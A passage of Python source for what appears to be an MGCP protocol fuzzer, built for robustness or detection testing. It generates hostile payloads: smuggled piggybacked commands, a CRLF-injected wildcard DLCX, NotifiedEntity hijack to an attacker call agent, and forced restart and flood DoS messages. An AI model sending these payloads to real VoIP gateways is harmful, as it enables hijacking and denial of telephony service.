        msg = _basic_command(b"RQNT", txid, ep,
                             [f"X: {_rand_hex()}", "R: " + ", ".join(events)])
    elif variant == "observed_events_flood":
        # NTFY with hundreds of observed events + timestamps
        events = [f"D/{random.randint(0,9)}" for _ in range(random.randint(200, 1000))]
        msg = _basic_command(b"NTFY", txid, ep,
                             [f"X: {_rand_hex()}", "O: " + ",".join(events)])
    elif variant == "signal_infinite_duration":
        # Multiple OO (On-Off) signals that never stop + conflicting TO signals
        signals = [f"L/rg", f"L/vmwi", f"L/sl", f"L/wt", f"G/ft(TO=999999999)"]
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"X: {_rand_hex()}", "R: L/hd(N)",
                              "S: " + ", ".join(signals)])
    else:  # nested_embedded_rqnt
        # E() inside E() inside E() — nested embedded notification requests
        depth = random.randint(10, 50)
        inner = "R(L/hd(N)),S(L/rg)"
        for _ in range(depth):
            inner = f"R(L/hd(E({inner}))),S(L/rg)"
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"X: {_rand_hex()}", f"R: L/hd(E({inner}))"])

    return msg[:_MAX_SEG], _MGCP_GW_PORT


# ── Strategy 9: Piggyback Smuggling ───────────────────────────────────────
# RFC 3435 §3.5.5: Multiple MGCP messages in one UDP datagram separated
# by a line containing a single dot ".".  Each processed independently.
# This creates a unique message-boundary attack surface.

def _build_piggyback_smuggling(payload_override=None):
    if payload_override is not None:
        ep = _rand_endpoint()
        msg1 = _basic_command(b"NTFY", _rand_txid(), ep,
                              [f"X: {_rand_hex()}", "O: L/hd"])
        msg2 = _basic_command(b"NTFY", _rand_txid(), ep,
                              [f"X: {_rand_hex()}", "O: L/hd"])
        return (msg1 + b"." + _CRLF + payload_override + _CRLF +
                b"." + _CRLF + msg2)[:_MAX_SEG], _MGCP_GW_PORT
    variant = random.choice([
        "legit_plus_evil", "command_plus_response", "mass_piggyback",
        "dot_separator_variations", "dot_inside_sdp", "no_dot_between",
        "dot_only_datagram", "response_then_command",
    ])

    ep = _rand_endpoint()

    if variant == "legit_plus_evil":
        # First message is a harmless AUEP, second is a malicious CRCX
        msg1 = _basic_command(b"AUEP", _rand_txid(), ep)
        evil_ep = f"*@{_rand_domain()}"  # wildcard amplification
        msg2 = _basic_command(b"DLCX", _rand_txid(), evil_ep,
                              [f"C: {_rand_hex()}"])
        msg = msg1 + b"." + _CRLF + msg2
    elif variant == "command_plus_response":
        # Command and response piggybacked — protocol confusion
        cmd = _basic_command(b"AUEP", _rand_txid(), ep)
        resp = _basic_response(200, _rand_txid(), b"OK",
                               [f"I: {_rand_hex(8)}"])
        msg = cmd + b"." + _CRLF + resp
    elif variant == "mass_piggyback":
        # 100+ messages in a single datagram
        parts = []
        for _ in range(random.randint(100, 300)):
            parts.append(_basic_command(random.choice(_VERBS).decode(),
                                        _rand_txid(), _rand_endpoint()))
        msg = (b"." + _CRLF).join(parts)
    elif variant == "dot_separator_variations":
        # Variations on the dot separator
        msg1 = _basic_command(b"AUEP", _rand_txid(), ep)
        msg2 = _basic_command(b"AUEP", _rand_txid(), ep)
        separators = [b".\r\n", b".\n", b". \r\n", b"..\r\n", b".\t\r\n",
                      b".\r", b".\x00\r\n"]
        sep = random.choice(separators)
        msg = msg1 + sep + msg2
    elif variant == "dot_inside_sdp":
        # SDP body that contains a ".\r\n" line — confuses piggyback parser
        sdp = _minimal_sdp()
        # Insert dot line in middle of SDP
        sdp_lines = sdp.split(_CRLF)
        mid = len(sdp_lines) // 2
        sdp_lines.insert(mid, b".")
        evil_sdp = _CRLF.join(sdp_lines)
        msg = _basic_command(b"CRCX", _rand_txid(), ep,
                             [f"C: {_rand_hex()}", "M: sendrecv"],
                             sdp_body=evil_sdp)
    elif variant == "no_dot_between":
        # Two messages with no separator at all — where does one end?
        msg1 = _basic_command(b"AUEP", _rand_txid(), ep)
        msg2 = _basic_command(b"CRCX", _rand_txid(), ep,
                              [f"C: {_rand_hex()}", "M: sendrecv"])
        msg = msg1 + msg2  # no dot separator
    elif variant == "dot_only_datagram":
        # Datagram containing only dot lines
        msg = (b"." + _CRLF) * random.randint(100, 1000)
    else:  # response_then_command
        # Response first, then dot, then command — reversed order
        resp = _basic_response(200, _rand_txid(), b"OK")
        cmd = _basic_command(b"RQNT", _rand_txid(), ep,
                             [f"X: {_rand_hex()}", "R: L/hd(N)"])
        msg = resp + b"." + _CRLF + cmd

    return msg[:_MAX_SEG], _MGCP_GW_PORT


# ── Strategy 10: Provisional Response Flood ───────────────────────────────
# RFC 3435: 100 (Pending/long transaction), 101 (queued/overload).
# ResponseAck (K) with huge transaction-id ranges.

def _build_provisional_response_flood():
    variant = random.choice([
        "hundred_provisionals", "return_code_boundaries",
        "oversized_commentary", "multiple_finals",
        "response_ack_ranges", "package_specific_8xx",
    ])

    txid = _rand_txid()

    if variant == "hundred_provisionals":
        # Flood of 100/101 provisional responses for same txid
        parts = []
        for _ in range(random.randint(50, 200)):
            code = random.choice([100, 101])
            parts.append(f"{code} {txid} {'Pending' if code == 100 else 'Queued'}".encode() + _CRLF)
        msg = b"".join(parts)
    elif variant == "return_code_boundaries":
        # Return codes outside valid range
        bad_codes = [0, -1, 999, 1000, 65535, 2147483647, 100000]
        parts = []
        for code in bad_codes:
            parts.append(f"{code} {txid} BadCode".encode() + _CRLF)
        msg = b"".join(parts)
    elif variant == "oversized_commentary":
        # Response with 50KB commentary string
        commentary = "X" * random.randint(20000, 50000)
        msg = f"200 {txid} {commentary}".encode() + _CRLF
    elif variant == "multiple_finals":
        # Multiple final responses for same txid (200 then 500 then 200)
        parts = [
            f"200 {txid} OK".encode() + _CRLF,
            f"500 {txid} Failure".encode() + _CRLF,
            f"200 {txid} OK Again".encode() + _CRLF,
        ]
        msg = b"".join(parts)
    elif variant == "response_ack_ranges":
        # K: parameter with huge transaction-id ranges
        # K: 1-999999999 means ack ALL transactions
        ranges = ["1-999999999", "0-4294967295",
                  ", ".join([f"{i}-{i+100}" for i in range(0, 10000, 101)])]
        k_val = random.choice(ranges)
        ep = _rand_endpoint()
        msg = _basic_command(b"AUEP", txid, ep,
                             [f"K: {k_val}"])
    else:  # package_specific_8xx
        # 8xx return codes require /packageName — test with/without
        codes = [800, 801, 850, 899]
        parts = []
        for code in codes:
            # With package name
            parts.append(f"{code} {txid}/L Bad package event".encode() + _CRLF)
            # Without package name (invalid per RFC 3661)
            parts.append(f"{code} {txid} No package".encode() + _CRLF)
            # With unknown package
            parts.append(f"{code} {txid}/ZZZZZZ Unknown".encode() + _CRLF)
        msg = b"".join(parts)

    return msg[:_MAX_SEG], _MGCP_GW_PORT


# ── Strategy 11: Version/Protocol Confusion ───────────────────────────────
# MGCP identification: "MGCP" version in command line.
# No dedicated Snort inspector — relies on text rules.
# Cross-protocol injection confuses appid.

def _build_version_protocol_confusion():
    variant = random.choice([
        "bad_version", "sip_on_mgcp_port", "http_on_mgcp_port",
        "case_manipulation", "ncs_tgcp_variant", "missing_mgcp_keyword",
        "extra_version_fields", "mixed_protocol_piggyback",
    ])

    ep = _rand_endpoint()
    txid = _rand_txid()

    if variant == "bad_version":
        # Wrong MGCP version
        bad_versions = [b"MGCP 2.0", b"MGCP 0.1", b"MGCP 99.99",
                        b"MGCP 1.0.1", b"MGCP -1.0", b"MGCP 0.0",
                        b"MGCP 1.0extra"]
        ver = random.choice(bad_versions)
        msg = b"AUEP " + txid.encode() + b" " + ep.encode() + b" " + ver + _CRLF
    elif variant == "sip_on_mgcp_port":
        # SIP INVITE sent to MGCP port 2427 — cross-protocol confusion
        sip_msg = (
            f"INVITE sip:user@{_rand_domain()} SIP/2.0\r\n"
            f"Via: SIP/2.0/UDP {_rand_ip()}:5060;branch=z9hG4bK{_rand_hex(16)}\r\n"
            f"From: <sip:a@b.c>;tag=abc\r\n"
            f"To: <sip:user@{_rand_domain()}>\r\n"
            f"Call-ID: {_rand_hex(24)}@cross\r\n"
            f"CSeq: 1 INVITE\r\n"
            f"Content-Length: 0\r\n\r\n"
        ).encode()
        msg = sip_msg
    elif variant == "http_on_mgcp_port":
        # HTTP request to MGCP port
        msg = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {_rand_ip()}:2427\r\n"
            f"User-Agent: MGCP-Fuzzer\r\n\r\n"
        ).encode()
    elif variant == "case_manipulation":
        # MGCP keyword case variations (RFC says case-insensitive)
        cases = [b"mgcp 1.0", b"Mgcp 1.0", b"mGcP 1.0", b"MGCP 1.0",
                 b"MgCp 1.0"]
        ver = random.choice(cases)
        msg = b"AUEP " + txid.encode() + b" " + ep.encode() + b" " + ver + _CRLF
    elif variant == "ncs_tgcp_variant":
        # NCS (Network-based Call Signaling) and TGCP are MGCP variants
        # Use their version identifiers
        variants = [b"NCS 1.0", b"TGCP 1.0", b"NCS 2.0", b"MEGACO 1.0"]
        ver = random.choice(variants)
        msg = b"CRCX " + txid.encode() + b" " + ep.encode() + b" " + ver + _CRLF
        msg += f"C: {_rand_hex()}\r\nM: sendrecv\r\n".encode()
    elif variant == "missing_mgcp_keyword":
        # No "MGCP" at all
        msg = b"AUEP " + txid.encode() + b" " + ep.encode() + _CRLF
    elif variant == "extra_version_fields":
        # Extra tokens after version
        junk = b"profile1 profile2 " + b"X" * random.randint(100, 5000)
        msg = b"AUEP " + txid.encode() + b" " + ep.encode() + b" MGCP 1.0 " + junk + _CRLF
    else:  # mixed_protocol_piggyback
        # MGCP command piggybacked with SIP message in same datagram
        mgcp_cmd = _basic_command(b"AUEP", txid, ep)
        sip_msg = (
            f"OPTIONS sip:probe@{_rand_domain()} SIP/2.0\r\n"
            f"Via: SIP/2.0/UDP {_rand_ip()}:5060;branch=z9hG4bKmixed\r\n"
            f"Content-Length: 0\r\n\r\n"
        ).encode()
        msg = mgcp_cmd + b"." + _CRLF + sip_msg

    return msg[:_MAX_SEG], _MGCP_GW_PORT


# ── Strategy 12: NotifiedEntity Hijack ────────────────────────────────────
# N: (NotifiedEntity) = current controlling Call Agent per endpoint.
# Central to failover.  No auth = any source can redefine it.

def _build_notified_entity_hijack():
    variant = random.choice([
        "redirect_to_attacker", "oversized_domain", "port_overflow",
        "empty_notified_entity", "multiple_n_params",
        "ipv6_notified_entity", "null_in_entity", "domain_with_crlf",
    ])

    ep = _rand_endpoint()
    txid = _rand_txid()

    if variant == "redirect_to_attacker":
        # RQNT/CRCX with N: pointing to attacker
        attacker = f"evil-ca@{_rand_ip()}:{random.randint(1024, 65535)}"
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"N: {attacker}", f"X: {_rand_hex()}", "R: L/hd(N)"])
    elif variant == "oversized_domain":
        # N: with 10KB domain name
        big_domain = "a" * random.randint(5000, 20000) + ".example.com"
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"N: ca@{big_domain}", f"X: {_rand_hex()}", "R: L/hd(N)"])
    elif variant == "port_overflow":
        # Port number overflow
        bad_ports = ["99999", "0", "-1", "65536", "4294967296", "port"]
        port = random.choice(bad_ports)
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"N: ca@{_rand_ip()}:{port}", f"X: {_rand_hex()}", "R: L/hd(N)"])
    elif variant == "empty_notified_entity":
        # Empty N: — disables DNS failover per RFC
        msg = _basic_command(b"RQNT", txid, ep,
                             ["N:", f"X: {_rand_hex()}", "R: L/hd(N)"])
    elif variant == "multiple_n_params":
        # Multiple N: parameters — which one wins?
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"N: legit-ca@{_rand_ip()}:2727",
                              f"N: evil-ca@{_rand_ip()}:6666",
                              f"N: other@{_rand_ip()}:2727",
                              f"X: {_rand_hex()}", "R: L/hd(N)"])
    elif variant == "ipv6_notified_entity":
        ipv6_forms = [
            "ca@[::1]:2727", "ca@[fe80::1%25eth0]:2727",
            f"ca@[{'F' * 500}]:2727",  # oversized
            "ca@[::1",  # missing bracket
        ]
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"N: {random.choice(ipv6_forms)}", f"X: {_rand_hex()}", "R: L/hd(N)"])
    elif variant == "null_in_entity":
        entity = f"ca\x00@{_rand_ip()}\x00:2727"
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"N: {entity}", f"X: {_rand_hex()}", "R: L/hd(N)"])
    else:  # domain_with_crlf
        # CRLF injection in N: value
        entity = f"ca@{_rand_ip()}:2727\r\nDLCX {_rand_txid()} *@evil.com MGCP 1.0"
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"N: {entity}", f"X: {_rand_hex()}", "R: L/hd(N)"])

    return msg[:_MAX_SEG], _MGCP_GW_PORT


# ── Strategy 13: Quarantine Handling Abuse ────────────────────────────────
# Q: controls event handling during transitions.  Quarantine buffer
# accumulates events.  Q:loop can cause infinite notification cycles.

def _build_quarantine_handling_abuse():
    variant = random.choice([
        "q_loop_infinite", "unknown_handling", "quarantine_buffer_flood",
        "q_process_discard_conflict", "q_with_embedded_rqnt",
        "rapid_rqnt_quarantine_race",
    ])

    ep = _rand_endpoint()
    txid = _rand_txid()

    if variant == "q_loop_infinite":
        # Q:loop — events re-queued after processing -> infinite cycle
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"X: {_rand_hex()}", "R: L/hd(N), L/hu(N)",
                              "Q: loop", "S: L/rg"])
    elif variant == "unknown_handling":
        # Unknown quarantine methods
        bad_q = random.choice(["Q: unknown", "Q: infinite", "Q: crash",
                                "Q: " + "X" * 5000, "Q:"])
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"X: {_rand_hex()}", "R: L/hd(N)", bad_q])
    elif variant == "quarantine_buffer_flood":
        # Rapid NTFY flood to overflow quarantine buffer
        parts = []
        for i in range(random.randint(100, 500)):
            parts.append(_basic_command(b"NTFY", _rand_txid(), ep,
                                        [f"X: {_rand_hex()}", f"O: D/{i % 10}"]))
        msg = (b"." + _CRLF).join(parts)
    elif variant == "q_process_discard_conflict":
        # Conflicting Q: values
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"X: {_rand_hex()}", "R: L/hd(N)",
                              "Q: process", "Q: discard", "Q: loop"])
    elif variant == "q_with_embedded_rqnt":
        # Quarantine + embedded RQNT — complex state interaction
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"X: {_rand_hex()}",
                              "R: L/hd(E(R(L/hu(N),D/[0-9](A)),S(L/dl),D(0T|1xxxx)),N)",
                              "Q: loop",
                              "S: L/rg"])
    else:  # rapid_rqnt_quarantine_race
        # Rapid RQNT commands racing each other — quarantine state confusion
        parts = []
        for _ in range(random.randint(50, 200)):
            q = random.choice(["process", "discard", "loop"])
            parts.append(_basic_command(b"RQNT", _rand_txid(), ep,
                                        [f"X: {_rand_hex()}", "R: L/hd(N)",
                                         f"Q: {q}"]))
        msg = (b"." + _CRLF).join(parts)

    return msg[:_MAX_SEG], _MGCP_GW_PORT


# ── Strategy 14: Restart Cascade DoS ─────────────────────────────────────
# RSIP (RestartInProgress) MG->CA: gateway restarting.
# RM: graceful/forced/restart/disconnected/cancel-graceful.
# RD: delay in seconds.  Wildcard endpoints = all restart.

def _build_restart_cascade_dos():
    variant = random.choice([
        "rsip_wildcard_forced", "rd_integer_overflow",
        "rapid_restart_oscillation", "rsip_all_methods",
        "rsip_with_reason_codes", "rsip_flood_spoofed",
    ])

    domain = f"gw-{random.randint(1,9999)}.example.net"

    if variant == "rsip_wildcard_forced":
        # RSIP forced on wildcard endpoint * = ALL endpoints restart
        msg = _basic_command(b"RSIP", _rand_txid(), f"*@{domain}",
                             ["RM: forced", "RD: 0"])
    elif variant == "rd_integer_overflow":
        # RestartDelay at integer boundaries
        bad_delays = ["0", "-1", "4294967295", "4294967296",
                      "9999999999999", "999999999999999999"]
        rd = random.choice(bad_delays)
        msg = _basic_command(b"RSIP", _rand_txid(), f"aaln/1@{domain}",
                             ["RM: restart", f"RD: {rd}"])
    elif variant == "rapid_restart_oscillation":
        # Alternate restart / cancel-graceful rapidly -> state machine confusion
        parts = []
        for i in range(random.randint(50, 200)):
            method = "restart" if i % 2 == 0 else "cancel-graceful"
            parts.append(_basic_command(b"RSIP", _rand_txid(),
                                        f"aaln/{(i % 24) + 1}@{domain}",
                                        [f"RM: {method}", "RD: 0"]))
        msg = (b"." + _CRLF).join(parts)
    elif variant == "rsip_all_methods":
        # One RSIP for each restart method
        methods = ["graceful", "forced", "restart", "disconnected", "cancel-graceful"]
        parts = []
        for m in methods:
            parts.append(_basic_command(b"RSIP", _rand_txid(), f"*@{domain}",
                                        [f"RM: {m}", "RD: 0"]))
        msg = (b"." + _CRLF).join(parts)
    elif variant == "rsip_with_reason_codes":
        # RSIP with various reason codes including undefined ones
        reason_codes = ["000", "900", "901", "902", "903", "904", "905",
                        "800", "850", "899", "999", "-1", "65535"]
        parts = []
        for rc in reason_codes:
            parts.append(_basic_command(b"RSIP", _rand_txid(), f"aaln/1@{domain}",
                                        ["RM: forced", "RD: 0", f"E: {rc}"]))
        msg = (b"." + _CRLF).join(parts)
    else:  # rsip_flood_spoofed
        # Mass RSIP from many different "gateways"
        parts = []
        for i in range(random.randint(100, 500)):
            fake_domain = f"gw-{random.randint(1,99999)}.{_rand_domain()}"
            parts.append(_basic_command(b"RSIP", _rand_txid(),
                                        f"*@{fake_domain}",
                                        ["RM: disconnected", "RD: 0",
                                         "E: 900"]))
        msg = (b"." + _CRLF).join(parts)

    return msg[:_MAX_SEG], _MGCP_GW_PORT


# ── Strategy dispatch map ─────────────────────────────────────────────────

_STRATEGY_MAP = {
    "verb_line_overflow":               _build_verb_line_overflow,
    "transaction_id_desync":            _build_transaction_id_desync,
    "endpoint_wildcard_abuse":          _build_endpoint_wildcard_abuse,
    "parameter_injection":              _build_parameter_injection,
    "digit_map_bomb":                   _build_digit_map_bomb,
    "local_connection_opts_overflow":   _build_local_connection_opts_overflow,
    "sdp_mgcp_body_mismatch":          _build_sdp_mgcp_body_mismatch,
    "event_package_overflow":           _build_event_package_overflow,
    "piggyback_smuggling":              _build_piggyback_smuggling,
    "provisional_response_flood":       _build_provisional_response_flood,
    "version_protocol_confusion":       _build_version_protocol_confusion,
    "notified_entity_hijack":           _build_notified_entity_hijack,
    "quarantine_handling_abuse":        _build_quarantine_handling_abuse,
    "restart_cascade_dos":              _build_restart_cascade_dos,
}


_MGCP_OVERRIDE_CAPABLE = frozenset(["piggyback_smuggling"])

def build_mgcp_payload(strategy, payload_override=None):
    """Build one MGCP payload. Returns (payload_bytes, dst_port)."""
    fn = _STRATEGY_MAP.get(strategy)
    if fn:
        if payload_override is not None and strategy in _MGCP_OVERRIDE_CAPABLE:
            return fn(payload_override=payload_override)
        return fn()
    # Fallback: simple AUEP
    return _basic_command(b"AUEP", _rand_txid(), _rand_endpoint()), _MGCP_GW_PORT


# ── Mutator class ─────────────────────────────────────────────────────────

class MgcpMutator:
    def __init__(self, external_weights=None, bandit=None):
        self.strategies = MGCP_STRATEGIES
        self._external_weights = external_weights
        self._bandit = bandit

    @property
    def weights(self):
        if self._external_weights:
            return [self._external_weights.get(s, 5) for s in self.strategies]
        return MGCP_WEIGHTS

    def mutate(self, payload_override=None):
        """Returns (payload_bytes, strategy_name, dst_port)."""
        if self._bandit:
            strategy = self._bandit.select_with_weights(self._external_weights or {})
        else:
            strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
        payload, dst_port = build_mgcp_payload(strategy, payload_override=payload_override)
        return payload, strategy, dst_port
